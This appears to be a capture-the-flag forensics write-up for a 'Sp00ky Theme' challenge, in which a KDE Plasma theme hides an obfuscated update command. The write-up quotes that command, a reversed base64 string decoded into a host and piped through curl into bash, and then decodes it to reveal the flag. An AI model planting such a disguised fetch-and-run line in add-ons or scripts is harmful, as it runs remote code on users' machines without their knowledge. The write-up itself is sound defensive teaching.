---
layout: default
title: Sp00ky Theme
---

# [Hack The Boo 2024 - Practice](index.md) - Forensics - Sp00ky Theme

> I downloaded a very nice haloween global theme for my Plasma installation and a couple of widgets! It was supposed to keep the bad spirits away while I was improving my ricing skills... Howerver, now strange things are happening and I can't figure out why...

We are provided with a Zip file that appears to contain a theme for KDE Plasma.

Skimming through the files, we find some curiosities...


## utils.js

```js
const PLASMOID_UPDATE_SOURCE = 
    "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
```

Always on the lookout for any kind of base64 string, this part of this file stood out to me right away. It's unlikely that a Plasma widget like this would need to store it's update URL in this manner... possibly I suppose, but unlikely. 

The above code sends the string `952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS` through `rev` to reverse it, then base64 decodes it.

Repeating these steps with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=OTUyTXdCSE5vOWxiME0yWDBGelgvRXljejAyTW9SM1g1SjJYa05qYjNCM2VDUkZT):


```
952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS
```

Reversed
```
SFRCe3B3bjNkX2J5X3RoM20zcyE/XzF0X2M0bl9oNHBwM259
```

Base64 decoded
```
HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}
```

And, we've found the flag.

The lesson here is that program addons (for Plasma, or something like VSCode) might contain malicious stuff, and you might not notice when you install it.